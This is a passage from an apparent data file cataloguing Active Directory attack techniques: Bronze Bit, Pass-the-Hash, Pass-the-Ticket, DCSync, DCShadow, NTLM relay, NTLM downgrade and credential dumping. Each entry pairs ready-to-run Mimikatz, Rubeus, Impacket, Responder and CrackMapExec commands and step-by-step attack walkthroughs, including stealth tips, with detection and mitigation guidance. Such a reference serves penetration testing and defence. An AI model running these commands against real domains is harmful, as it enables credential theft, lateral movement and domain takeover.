        command: "Rubeus.exe s4u /user:svc_web /rc4:SVC_HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /forcenewticket /ptt",
        description: "Rubeus can be modified to flip the forwardable flag in the S4U2Self ticket before sending S4U2Proxy"
      }
    ],
    steps: [
      "Step 1: Identify a compromised service account with constrained delegation configured (msDS-AllowedToDelegateTo is set) but WITHOUT the TRUSTED_TO_AUTH_FOR_DELEGATION flag. This is the scenario where Bronze Bit is needed.",
      "Step 2: Verify the target domain controller is unpatched or has not enforced the Bronze Bit fix. The patch (KB4598347) was released in December 2020 with enforcement phased in over several months.",
      "Step 3: Use Impacket getST.py with the -force-forwardable flag to perform S4U2Self and modify the forwardable bit in the encrypted ticket data before sending the S4U2Proxy request.",
      "Step 4: The KDC processes the S4U2Proxy request, checking the forwardable flag (which has been flipped to true) and the delegation configuration. It issues a service ticket to the target service as the impersonated user.",
      "Step 5: This attack also bypasses the 'Account is sensitive and cannot be delegated' flag and Protected Users group membership for the impersonated user, as these protections relied on the non-forwardable ticket preventing delegation.",
      "Step 6: Use the resulting service ticket to access the target service as the impersonated user. This provides access that was previously blocked by the lack of protocol transition.",
      "Step 7: Chain with alternative service names to access multiple services on the target host."
    ],
    detection: "After patching, the KDC logs Event ID 35 (Kerberos KDC) when it detects a forwardable flag mismatch. Monitor for S4U2Proxy requests where the presented evidence ticket has been modified. Pre-patch detection is difficult as the modification occurs in the encrypted portion of the ticket. Post-patch, monitor for the specific Kerberos KDC events introduced by the fix. Microsoft Defender for Identity includes detection rules for Bronze Bit exploitation attempts.",
    mitigation: "Apply the security update KB4598347 to all domain controllers and enable enforcement mode. The patch was released in three phases: Phase 1 (December 2020) adds event logging, Phase 2 (March 2021) enables enforcement by default, Phase 3 (full enforcement). Verify enforcement is active by checking the registry key HKLM\\System\\CurrentControlSet\\Services\\Kdc\\KrbtgtFullPacSignature. Additionally, implement all standard delegation security measures: minimize constrained delegation usage, use Protected Users group, and set sensitive accounts to cannot be delegated.",
    references: [
      "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/",
      "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/",
      "https://support.microsoft.com/en-us/topic/kb4598347-managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049-569d60b7-3267-e27a-d6d1-36ea321f0599"
    ]
  },
  // -------------------------------------------------------------------------
  // Credential Attacks
  // -------------------------------------------------------------------------
  {
    id: "AD-015",
    name: "Pass-the-Hash",
    category: "lateral_movement",
    description: "Pass-the-Hash (PtH) is a lateral movement technique that allows an attacker to authenticate to remote services using the NTLM hash of a user's password instead of the plaintext password. NTLM authentication uses a challenge-response mechanism where the client proves knowledge of the password by computing an HMAC-MD5 over the server's challenge using the NT hash as the key. Since the NT hash itself is the secret (not the plaintext password), possessing the hash is equivalent to possessing the password for NTLM authentication purposes. PtH is possible because Windows stores password hashes in the SAM database (local accounts) and in LSASS memory (cached domain credentials). The technique has been a cornerstone of Active Directory lateral movement since its documentation in the late 1990s. While Kerberos is the default authentication protocol in AD environments, many services still accept NTLM authentication as a fallback, making PtH widely applicable. The attack is mitigated by Windows Credential Guard (which protects LSASS) and by disabling NTLM authentication, though the latter is often impractical in legacy environments.",
    prerequisites: [
      "NTLM hash of a user account (obtained from LSASS dump, SAM extraction, DCSync, or network capture)",
      "Target service must accept NTLM authentication",
      "Network access to the target on relevant ports (445 for SMB, 5985/5986 for WinRM, etc.)"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe\"",
        description: "Creates a new process with the specified NTLM hash injected for NTLM authentication"
      },
      {
        name: "Impacket psexec",
        command: "python3 psexec.py domain.local/Administrator@target -hashes :NTLM_HASH",
        description: "Executes commands on a remote system using PtH via SMB"
      },
      {
        name: "Impacket wmiexec",
        command: "python3 wmiexec.py domain.local/Administrator@target -hashes :NTLM_HASH",
        description: "Executes commands remotely via WMI using PtH"
      },
      {
        name: "Impacket smbexec",
        command: "python3 smbexec.py domain.local/Administrator@target -hashes :NTLM_HASH",
        description: "Executes commands via SMB service creation using PtH"
      },
      {
        name: "CrackMapExec",
        command: "crackmapexec smb 10.0.0.0/24 -u Administrator -H NTLM_HASH --shares",
        description: "Sprays the hash across a subnet to find accessible hosts and enumerate shares"
      },
      {
        name: "NetExec",
        command: "nxc smb 10.0.0.0/24 -u Administrator -H NTLM_HASH -x 'whoami'",
        description: "Executes commands across multiple targets using PtH with NetExec"
      },
      {
        name: "evil-winrm",
        command: "evil-winrm -i target -u Administrator -H NTLM_HASH",
        description: "Connects via WinRM using pass-the-hash for PowerShell remoting access"
      }
    ],
    steps: [
      "Step 1: Obtain the NTLM hash of a target user. Sources include: LSASS memory dump (Mimikatz sekurlsa::logonpasswords), SAM database extraction (reg save HKLM\\SAM sam.save followed by secretsdump.py), NTDS.dit extraction, DCSync, or network capture of NTLM authentication traffic.",
      "Step 2: Identify target systems where the compromised account has access. Use CrackMapExec or NetExec to spray the hash across the network: crackmapexec smb 10.0.0.0/24 -u user -H HASH. Systems showing 'Pwn3d!' have administrative access.",
      "Step 3: Execute commands on target systems using the hash. From Windows, use Mimikatz sekurlsa::pth to inject the hash into a new logon session. From Linux, use Impacket psexec.py, wmiexec.py, smbexec.py, or evil-winrm.",
      "Step 4: For stealthier execution, prefer wmiexec.py (uses WMI, no service creation) or evil-winrm (uses WinRM over HTTP) over psexec.py (creates a service and writes a binary to disk).",
      "Step 5: Once on the target, dump additional credentials using Mimikatz or comsvcs.dll to obtain more hashes for further lateral movement.",
      "Step 6: Use CrackMapExec with --sam flag to extract local account hashes from targets: crackmapexec smb target -u Admin -H HASH --sam. This may reveal shared local admin passwords across systems.",
      "Step 7: Map the lateral movement path toward high-value targets (domain controllers, tier-0 assets) using BloodHound to identify shortest paths.",
      "Step 8: When targeting domain controllers, use the obtained access for DCSync: secretsdump.py domain.local/Admin@dc01 -hashes :HASH to extract all domain credentials."
    ],
    detection: "Monitor for Event ID 4624 (Logon) with Logon Type 3 (Network) and authentication package NTLM, especially when the source is a workstation that normally uses Kerberos. Event ID 4625 (Failed Logon) with NTLM can indicate hash spraying. Look for Event ID 4776 (Credential Validation) on domain controllers. Monitor for NTLM authentication to sensitive services that should only accept Kerberos. Track lateral movement patterns: a single source IP authenticating to many targets in a short period is suspicious. Microsoft Defender for Identity detects PtH by correlating NTLM authentications with credential theft events. Enable NTLM auditing via Group Policy: Network security: Restrict NTLM: Audit NTLM authentication in this domain.",
    mitigation: "Deploy Windows Credential Guard on all workstations and servers to protect credentials in LSASS. Implement Local Administrator Password Solution (LAPS) to ensure unique local admin passwords on each system. Restrict NTLM authentication via Group Policy where feasible. Enable the Protected Users group for privileged accounts (prevents NTLM hash caching). Implement network segmentation and restrict lateral movement paths. Use Privileged Access Workstations (PAWs) for administrative tasks. Disable the WDigest authentication protocol to prevent cleartext credential caching: Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to 0.",
    references: [
      "https://attack.mitre.org/techniques/T1550/002/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts",
      "https://www.sans.org/blog/pass-the-hash-attacks-tools-mitigation/"
    ]
  },
  {
    id: "AD-016",
    name: "Pass-the-Ticket",
    category: "lateral_movement",
    description: "Pass-the-Ticket (PtT) is a lateral movement technique that uses stolen Kerberos tickets (TGTs or TGS tickets) to authenticate as another user without needing their password or hash. Unlike Pass-the-Hash which relies on NTLM authentication, PtT operates within the Kerberos protocol, making it effective in environments where NTLM is restricted. Kerberos tickets are cached in LSASS memory on Windows systems and in ccache files on Linux systems. An attacker who can extract these tickets can inject them into their own session to assume the identity of the ticket owner. TGTs are more valuable as they can be used to request service tickets for any service, while TGS tickets are limited to the specific service they were issued for. The technique is commonly used after compromising a system where a privileged user has an active session, allowing the attacker to steal their cached TGT and use it on another machine.",
    prerequisites: [
      "Access to a system where the target user has cached Kerberos tickets",
      "Local admin or SYSTEM access to extract tickets from LSASS",
      "Network access to target services"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Mimikatz (export)",
        command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\"",
        description: "Exports all Kerberos tickets from LSASS memory to .kirbi files on disk"
      },
      {
        name: "Mimikatz (inject)",
        command: "mimikatz.exe \"kerberos::ptt ticket.kirbi\"",
        description: "Injects a .kirbi ticket into the current session"
      },
      {
        name: "Rubeus (dump)",
        command: "Rubeus.exe dump /nowrap",
        description: "Dumps all Kerberos tickets from all logon sessions in base64 format"
      },
      {
        name: "Rubeus (inject)",
        command: "Rubeus.exe ptt /ticket:BASE64_TICKET",
        description: "Injects a base64-encoded ticket into the current session"
      },
      {
        name: "Impacket (convert)",
        command: "python3 ticketConverter.py ticket.kirbi ticket.ccache",
        description: "Converts a .kirbi ticket to .ccache format for use on Linux"
      },
      {
        name: "Impacket (use ticket)",
        command: "KRB5CCNAME=ticket.ccache python3 psexec.py -k -no-pass domain.local/Administrator@target",
        description: "Uses a .ccache ticket for Kerberos authentication with Impacket tools"
      }
    ],
    steps: [
      "Step 1: Identify systems where high-value users have active sessions. Use tools like BloodHound (Sessions collection), PowerView Get-NetLoggedon, or query user /server:target to find where Domain Admins are logged in.",
      "Step 2: Compromise one of the identified systems and gain SYSTEM or local admin access to read LSASS memory.",
      "Step 3: Export Kerberos tickets using Mimikatz sekurlsa::tickets /export or Rubeus dump. Mimikatz saves tickets as .kirbi files; Rubeus outputs base64-encoded tickets.",
      "Step 4: Identify the most valuable tickets -- TGTs (krbtgt service) are more versatile than TGS tickets. Look for tickets belonging to Domain Admins, Enterprise Admins, or other privileged accounts.",
      "Step 5: Transfer the tickets to your attack machine. If moving from Windows to Linux, convert .kirbi to .ccache using Impacket ticketConverter.py.",
      "Step 6: Inject the ticket on Windows using Mimikatz kerberos::ptt or Rubeus ptt. On Linux, set the KRB5CCNAME environment variable to the .ccache file path.",
      "Step 7: Use the injected identity to access resources. The ticket's lifetime determines how long the access persists (typically 10 hours for TGTs, renewable for up to 7 days by default).",
      "Step 8: Leverage the stolen identity for further attacks: access file shares, execute commands remotely, perform DCSync if the account has replication privileges, or access sensitive applications."
    ],
    detection: "Monitor for LSASS access events (Event ID 4656, 4663, and Sysmon Event ID 10) as ticket extraction requires reading LSASS memory. Track Kerberos ticket usage anomalies: a ticket being used from a different IP address than where it was issued indicates potential PtT. Event ID 4768 and 4769 show TGT and TGS usage patterns. Alert on Kerberos authentication from unexpected sources, especially for privileged accounts. Windows Event ID 4624 with Logon Type 3 using Kerberos from an atypical source workstation. Microsoft Defender for Identity correlates ticket usage with session locations to detect PtT.",
    mitigation: "Implement Credential Guard to protect Kerberos tickets in LSASS. Restrict where privileged accounts can log in using Group Policy and tiered administration. Ensure Domain Admin accounts only log in to domain controllers and PAWs. Shorten Kerberos ticket lifetimes via Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Kerberos Policy. Use the Protected Users group for privileged accounts, which limits ticket lifetime to 4 hours and prevents ticket renewal. Regularly review and terminate unnecessary administrative sessions.",
    references: [
      "https://attack.mitre.org/techniques/T1550/003/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-ticket-with-rubeus"
    ]
  },
  {
    id: "AD-017",
    name: "DCSync",
    category: "credential_theft",
    description: "DCSync is an attack that uses the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to impersonate a domain controller and request password data from another DC. Active Directory uses a multi-master replication model where domain controllers synchronize changes using the DRS (Directory Replication Service) protocol. An attacker with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights can use the DRSUAPI RPC interface to request replication of password data, effectively extracting NTLM hashes, Kerberos keys, and password history for any domain account. The attack was first implemented in Mimikatz by Benjamin Delpy and Vincent Le Toux. DCSync is particularly dangerous because it does not require code execution on a domain controller -- the attacker can perform the attack from any domain-joined machine. By default, Domain Admins, Enterprise Admins, and the domain controller computer accounts have the necessary replication rights. The attack can target specific accounts (like krbtgt for Golden Ticket creation) or extract the entire NTDS.dit database contents.",
    prerequisites: [
      "Account with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights",
      "These rights are held by: Domain Admins, Enterprise Admins, DC computer accounts, and any account explicitly granted replication rights",
      "Network access to a domain controller on RPC ports (TCP 135 and dynamic range)"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"lsadump::dcsync /domain:domain.local /user:krbtgt\"",
        description: "Performs DCSync to extract the krbtgt account hash for Golden Ticket creation"
      },
      {
        name: "Mimikatz (all users)",
        command: "mimikatz.exe \"lsadump::dcsync /domain:domain.local /all /csv\"",
        description: "Extracts NTLM hashes for all domain accounts"
      },
      {
        name: "Impacket secretsdump",
        command: "python3 secretsdump.py domain.local/Administrator:password@dc01.domain.local -just-dc-ntlm",
        description: "Performs DCSync to extract all NTLM hashes from the domain"
      },
      {
        name: "Impacket secretsdump (hash auth)",
        command: "python3 secretsdump.py domain.local/Administrator@dc01.domain.local -hashes :NTLM_HASH -just-dc",
        description: "DCSync using pass-the-hash authentication, extracting all credential data"
      },
      {
        name: "Impacket secretsdump (specific user)",
        command: "python3 secretsdump.py domain.local/Administrator@dc01.domain.local -hashes :NTLM_HASH -just-dc-user krbtgt",
        description: "DCSync for a specific user account only"
      },
      {
        name: "PowerView (check rights)",
        command: "Get-DomainObjectAcl -SearchBase 'DC=domain,DC=local' -SearchScope Base -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'DS-Replication-Get-Changes'} | Select-Object SecurityIdentifier, ObjectAceType",
        description: "Identifies all accounts with DCSync rights"
      }
    ],
    steps: [
      "Step 1: Verify you have an account with DCSync rights. Check using PowerView: Get-DomainObjectAcl -SearchBase 'DC=domain,DC=local' -SearchScope Base -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication'}. Look for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.",
      "Step 2: If you do not have DCSync rights directly, check if you have rights to grant yourself DCSync (WriteDACL on the domain object). If so, add the replication rights first, perform DCSync, then remove them.",
      "Step 3: Perform targeted DCSync for high-value accounts first. Extract the krbtgt hash for Golden Ticket capabilities: mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt. Also target built-in Administrator.",
      "Step 4: For a complete credential extraction, use Impacket secretsdump.py with -just-dc-ntlm for all NTLM hashes, or -just-dc for full output including Kerberos keys and password history.",
      "Step 5: Extract specific service accounts that may provide access to critical infrastructure: SQL servers, Exchange, backup systems, etc.",
      "Step 6: Use the extracted krbtgt hash to create Golden Tickets for persistent domain access. Use the Administrator hash for immediate privileged access.",
      "Step 7: Analyze the extracted hashes for password reuse by comparing hashes across accounts. Identical hashes indicate shared passwords.",
      "Step 8: If operational security is a concern, perform targeted DCSync for specific accounts rather than full domain extraction, as full extraction generates significantly more replication traffic."
    ],
    detection: "Monitor for Event ID 4662 (An operation was performed on an object) on domain controllers with the DS-Replication-Get-Changes-All extended right GUID ({1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}). Event ID 4624 (Logon) with Logon Type 3 from non-DC sources performing replication is highly suspicious. Microsoft Defender for Identity has built-in DCSync detection. Monitor DRS RPC traffic on the network -- replication requests from non-DC IP addresses are a strong indicator. Track changes to ACLs on the domain object that grant replication rights (Event ID 5136). SIEM correlation rules should flag replication activity from any host that is not a registered domain controller.",
    mitigation: "Audit and restrict accounts with DCSync rights. Only domain controller computer accounts, Domain Admins, and Enterprise Admins should have replication rights by default. Remove unnecessary grants using: Remove-DomainObjectAcl -TargetSearchBase 'DC=domain,DC=local' -PrincipalIdentity 'unwanted_user' -Rights DCSync. Monitor for changes to replication ACLs. Implement network segmentation to restrict RPC access to domain controllers. Deploy Microsoft Defender for Identity. Consider implementing a tiered administration model where Tier 0 credentials are only used on dedicated admin workstations.",
    references: [
      "https://attack.mitre.org/techniques/T1003/006/",
      "https://adsecurity.org/?p=1729",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync"
    ]
  },
  {
    id: "AD-018",
    name: "DCShadow",
    category: "persistence",
    description: "DCShadow is an advanced attack technique that temporarily registers a compromised machine as a domain controller in Active Directory, pushes malicious changes through AD replication, and then unregisters the fake DC. Unlike DCSync which reads data from a legitimate DC, DCShadow writes data to the directory by injecting changes into the replication stream. The attack abuses the AD replication mechanism by creating the necessary objects (nTDSDSA, server) in the Sites configuration to appear as a legitimate DC, then using DrsReplicaAdd to force other DCs to replicate from the rogue DC. This allows the attacker to modify any AD attribute (including group memberships, SPNs, ACLs, and SID history) without generating the typical directory modification event logs on legitimate DCs. The technique was presented by Vincent Le Toux and Benjamin Delpy at Bluehat IL 2018. DCShadow is particularly stealthy because the changes appear to come from normal AD replication rather than administrative actions, and the temporary DC registration is short-lived (seconds to minutes).",
    prerequisites: [
      "Domain Admin or equivalent privileges (to register a domain controller)",
      "Two Mimikatz instances: one running as SYSTEM for the RPC server, one as Domain Admin for pushing changes",
      "Network access to existing domain controllers"
    ],
    difficulty: "expert",
    tools: [
      {
        name: "Mimikatz (RPC server)",
        command: "mimikatz.exe \"lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512\"",
        description: "Starts the DCShadow RPC server to push a change setting the target user's primary group to Domain Admins (RID 512)"
      },
      {
        name: "Mimikatz (push)",
        command: "mimikatz.exe \"lsadump::dcshadow /push\"",
        description: "Triggers the replication push from the rogue DC to a legitimate DC (run as Domain Admin)"
      },
      {
        name: "Mimikatz (SIDHistory)",
        command: "mimikatz.exe \"lsadump::dcshadow /object:targetuser /attribute:sIDHistory /value:S-1-5-21-DOMAIN-SID-500\"",
        description: "Uses DCShadow to inject SID History, granting the target the permissions of the specified SID"
      },
      {
        name: "Mimikatz (SPN injection)",
        command: "mimikatz.exe \"lsadump::dcshadow /object:targetuser /attribute:servicePrincipalName /value:MSSQLSvc/target.domain.local\"",
        description: "Adds an SPN to an account via DCShadow for Kerberoasting setup"
      }
    ],
    steps: [
      "Step 1: Prepare the DCShadow environment. You need two elevated sessions: one running as SYSTEM (for the RPC server) and one with Domain Admin credentials (for triggering replication). Use PsExec -s for SYSTEM access.",
      "Step 2: In the SYSTEM session, run Mimikatz lsadump::dcshadow with the desired modification. For example, to add a user to Domain Admins: lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512. This starts the RPC server and registers the temporary DC.",
      "Step 3: In the Domain Admin session, trigger the replication push: lsadump::dcshadow /push. This forces a legitimate DC to replicate from the rogue DC, pulling the malicious changes.",
      "Step 4: The changes propagate through normal AD replication to all DCs. The temporary DC registration is automatically cleaned up by Mimikatz after the push completes.",
      "Step 5: Common DCShadow payloads include: modifying group memberships, injecting SID History for privilege escalation, adding SPNs for Kerberoasting, modifying ACLs on objects, and changing AdminCount/AdminSDHolder to establish persistence.",
      "Step 6: Verify the changes took effect by querying the target object: Get-ADUser targetuser -Properties primaryGroupID, memberOf, sIDHistory.",
      "Step 7: For maximum stealth, perform DCShadow operations during peak replication hours when additional replication traffic is less noticeable."
    ],
    detection: "Monitor for new nTDSDSA objects being created in the CN=Sites configuration partition, which indicates a new DC registration. Event ID 4742 (Computer Account Changed) may show changes to the computer object's servicePrincipalName when the temporary DC is registered. Monitor for DrsReplicaAdd operations from non-DC hosts using network traffic analysis. Event ID 4929 (Active Directory Replica Source Naming Context Removed) indicates a replication source was added and removed (characteristic of DCShadow). Microsoft Defender for Identity can detect DCShadow by monitoring for rogue DC registration attempts. Monitor the Sites configuration for unexpected server objects.",
    mitigation: "Deploy Microsoft Defender for Identity which has specific DCShadow detection capabilities. Monitor the AD Sites and Services configuration for unauthorized DC registrations. Implement strict controls on Domain Admin usage and deploy Privileged Access Workstations. Enable advanced replication monitoring and alert on replication topology changes. Restrict which machines can register as domain controllers through network ACLs and firewall rules. Implement change auditing on critical AD objects to detect post-DCShadow modifications.",
    references: [
      "https://attack.mitre.org/techniques/T1207/",
      "https://www.dcshadow.com/",
      "https://adsecurity.org/?p=4064"
    ]
  },
  {
    id: "AD-019",
    name: "NTLM Relay",
    category: "lateral_movement",
    description: "NTLM relay is an attack where an attacker intercepts an NTLM authentication attempt and relays it to a different target server to gain unauthorized access. In NTLM authentication, the client responds to a server's challenge with a response computed from the password hash. In a relay attack, the attacker positions themselves as a man-in-the-middle: they receive the client's authentication to their malicious server and simultaneously forward it to the legitimate target server, authenticating as the victim. This works because NTLM authentication does not cryptographically bind the authentication to the specific server being accessed (unless Extended Protection for Authentication / EPA is enabled). NTLM relay can target various protocols including SMB, HTTP, LDAP, LDAPS, MSSQL, and AD CS web enrollment endpoints. The attack is particularly devastating when combined with coercion techniques (PetitPotam, PrinterBug) that force high-privilege accounts to authenticate to the attacker. Relay to LDAP is especially dangerous as it allows the attacker to modify AD objects (create computer accounts, modify ACLs, configure RBCD). SMB signing, LDAP signing, LDAP channel binding, and EPA mitigate relay attacks for their respective protocols.",
    prerequisites: [
      "Man-in-the-middle position (via LLMNR/NBT-NS poisoning, ARP spoofing, DHCPv6, WPAD, or authentication coercion)",
      "Target server must not require signing (SMB signing disabled, LDAP signing not enforced)",
      "Cross-protocol relay: source and target must use compatible NTLM authentication"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Impacket ntlmrelayx",
        command: "python3 ntlmrelayx.py -t smb://target.domain.local -smb2support",
        description: "Relays captured NTLM authentication to a target SMB server"
      },
      {
        name: "Impacket ntlmrelayx (LDAP)",
        command: "python3 ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user attacker",
        description: "Relays to LDAP and escalates the specified user's privileges by granting DCSync rights"
      },
      {
        name: "Impacket ntlmrelayx (RBCD)",
        command: "python3 ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker",
        description: "Relays to LDAP and configures Resource-Based Constrained Delegation for computer account takeover"
      },
      {
        name: "Impacket ntlmrelayx (AD CS)",
        command: "python3 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
        description: "Relays to AD CS web enrollment to request a certificate as the relayed account"
      },
      {
        name: "Responder (listener)",
        command: "python3 Responder.py -I eth0 -wFb",
        description: "Captures NTLM authentication attempts via LLMNR/NBT-NS/WPAD poisoning for relay"
      },
      {
        name: "CrackMapExec (check signing)",
        command: "crackmapexec smb 10.0.0.0/24 --gen-relay-list nosigning.txt",
        description: "Identifies systems with SMB signing disabled for relay targeting"
      }
    ],
    steps: [
      "Step 1: Identify relay targets by scanning for systems without SMB signing: crackmapexec smb 10.0.0.0/24 --gen-relay-list nosigning.txt. For LDAP relay, check if LDAP signing is enforced on domain controllers.",
      "Step 2: Set up the relay framework. Start ntlmrelayx.py with the target list and desired action. For SMB relay: ntlmrelayx.py -tf targets.txt -smb2support. For LDAP relay with escalation: ntlmrelayx.py -t ldap://dc01 --escalate-user attacker.",
      "Step 3: Coerce authentication from a high-value target. Use PetitPotam, PrinterBug, or Responder to capture NTLM authentication. PetitPotam against a DC: python3 PetitPotam.py listener_ip dc01.domain.local.",
      "Step 4: When the authentication arrives, ntlmrelayx automatically relays it to the target. For SMB targets, it attempts to execute commands or dump SAM hashes. For LDAP, it performs the configured escalation action.",
      "Step 5: For LDAP relay with --escalate-user, ntlmrelayx grants the specified user DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights on the domain object, enabling DCSync.",
      "Step 6: For LDAP relay with --delegate-access, ntlmrelayx creates a new machine account and configures RBCD on the relayed computer, enabling S4U-based compromise.",
      "Step 7: For AD CS relay, ntlmrelayx requests a certificate as the relayed account from the Certificate Authority's web enrollment interface. This certificate can then be used for authentication.",
      "Step 8: After relay, use the gained access (SAM dump, DCSync rights, RBCD, certificate) for further exploitation."
    ],
    detection: "Monitor for Event ID 4624 (Logon) where the source IP differs from the machine account's registered IP. NTLM relay often shows authentication from unexpected source addresses. Track Event ID 4625 (Failed Logon) spikes which may indicate relay attempts. Monitor LDAP modifications (Event ID 5136) for unauthorized ACL changes or RBCD configuration. Watch for new machine account creation (Event ID 4741) from non-administrative contexts. Monitor AD CS certificate enrollment (Event ID 4886, 4887) for unexpected certificate requests. Network monitoring for NTLM authentication traffic between unexpected hosts is highly effective.",
    mitigation: "Enable SMB signing on all systems via Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always) = Enabled. Enforce LDAP signing: set ldapserverintegrity to 2 on domain controllers. Enable LDAP channel binding on domain controllers. Enable Extended Protection for Authentication (EPA) on web services. Disable NTLM where possible via Group Policy. Disable LLMNR (via Group Policy) and NBT-NS (via network adapter settings). Remove the AD CS HTTP enrollment endpoint or require HTTPS with EPA.",
    references: [
      "https://attack.mitre.org/techniques/T1557/001/",
      "https://www.thehacker.recipes/ad/movement/ntlm/relay",
      "https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/"
    ]
  },
  {
    id: "AD-020",
    name: "NTLM Downgrade Attack",
    category: "credential_theft",
    description: "NTLM downgrade attacks exploit the backward compatibility of the NTLM authentication protocol to force the use of weaker authentication mechanisms that are easier to crack or relay. NTLMv2 is significantly more secure than NTLMv1, as NTLMv2 responses include a client challenge and timestamp that make them harder to relay and crack. By manipulating the NTLM negotiation flags or the LAN Manager Authentication Level, an attacker can force a client to respond with an NTLMv1 response instead of NTLMv2. NTLMv1 responses can be cracked to recover the NTLM hash using rainbow tables or brute force against the DES-based challenge-response, and they can be more easily relayed because they lack the additional protections of NTLMv2. The attack is facilitated by the fact that the authentication level is negotiated between client and server, and a malicious server can request the weaker authentication type. Furthermore, if NTLMv1 with ESS (Extended Session Security) is disabled, the response can be cracked to recover the raw NTLM hash using services like crack.sh, which operate DES rainbow tables.",
    prerequisites: [
      "Man-in-the-middle position or control over a server that the target authenticates to",
      "Target system configured to allow NTLMv1 (LAN Manager Authentication Level < 3)",
      "For hash recovery: access to DES cracking resources (crack.sh or GPU infrastructure)"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Responder (NTLMv1 downgrade)",
        command: "python3 Responder.py -I eth0 --lm --disable-ess",
        description: "Captures NTLM authentication and attempts to downgrade to NTLMv1 without ESS for easier cracking"
      },
      {
        name: "Inveigh",
        command: "Invoke-Inveigh -LLMNR Y -NBNS Y -Challenge 1122334455667788",
        description: "Captures NTLM authentication with a fixed challenge value to enable rainbow table attacks"
      },
      {
        name: "ntlmv1-multi",
        command: "python3 ntlmv1.py --ntlmv1 HASH_STRING",
        description: "Converts captured NTLMv1 hashes into a format suitable for DES-based cracking"
      },
      {
        name: "hashcat (NTLMv1)",
        command: "hashcat -m 5500 ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt",
        description: "Cracks NTLMv1 hashes offline"
      }
    ],
    steps: [
      "Step 1: Verify the target environment allows NTLMv1. Check the Group Policy setting: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Network security: LAN Manager authentication level. Values of 0-2 allow NTLMv1.",
      "Step 2: Set up a rogue authentication listener. Use Responder with --lm --disable-ess flags to force NTLMv1 downgrade and disable Extended Session Security, or Inveigh with a fixed challenge value.",
      "Step 3: Coerce authentication from target systems using LLMNR/NBT-NS poisoning, PetitPotam, PrinterBug, or other techniques. The target will authenticate to your listener.",
      "Step 4: Capture the NTLMv1 response. If ESS was successfully disabled and a known challenge was used (like 1122334455667788), the response can be attacked with DES rainbow tables.",
      "Step 5: Convert the captured NTLMv1 hash to a DES-crackable format using the ntlmv1-multi tool. This splits the response into DES keys that can be attacked independently.",
      "Step 6: Submit the DES challenges to crack.sh or use GPU-based DES cracking to recover the raw NTLM hash. With the 1122334455667788 challenge, rainbow tables provide near-instant recovery.",
      "Step 7: Once the NTLM hash is recovered, use it for pass-the-hash attacks, Kerberos overpass-the-hash, or further credential cracking."
    ],
    detection: "Monitor for NTLMv1 authentication events. Event ID 4624 (Logon) includes the LmPackageName field which shows NTLM V1 or NTLM V2. Alert on any NTLMv1 authentication in environments that should use NTLMv2 or Kerberos exclusively. Monitor for LLMNR and NBT-NS queries and responses from unexpected sources. Track authentication to unknown or suspicious servers. Microsoft Defender for Identity can detect NTLM downgrade attempts.",
    mitigation: "Set the LAN Manager Authentication Level to 5 (Send NTLMv2 response only. Refuse LM and NTLM) via Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Network security: LAN Manager authentication level. This prevents NTLMv1 entirely. Disable NTLM where possible and use Kerberos-only authentication. Disable LLMNR via Group Policy and NBT-NS via network configuration. Monitor for and block unauthorized DHCP/DNS servers.",
    references: [
      "https://attack.mitre.org/techniques/T1557/",
      "https://crack.sh/",
      "https://www.optiv.com/insights/source-zero/blog/ntlm-downgrade-attacks"
    ]
  },
  {
    id: "AD-021",
    name: "Credential Dumping - LSASS, SAM, NTDS.dit",
    category: "credential_theft",
    description: "Credential dumping encompasses multiple techniques for extracting authentication credentials from Windows systems. The three primary credential stores are: LSASS (Local Security Authority Subsystem Service) which caches credentials for active and recent logon sessions in memory; the SAM (Security Account Manager) database which stores local account password hashes; and NTDS.dit which is the Active Directory database containing all domain account credentials on domain controllers. LSASS credential extraction provides plaintext passwords (if WDigest is enabled), NTLM hashes, and Kerberos tickets for currently cached logon sessions. SAM extraction provides NTLM hashes for local accounts. NTDS.dit extraction provides NTLM hashes and Kerberos keys for all domain accounts. Each target requires different access levels: LSASS requires local admin or SYSTEM on any domain-joined machine, SAM requires local admin, and NTDS.dit requires Domain Admin or backup operator privileges. Modern protections like Credential Guard, LSA Protection (RunAsPPL), and Remote Credential Guard significantly limit these attacks.",
    prerequisites: [
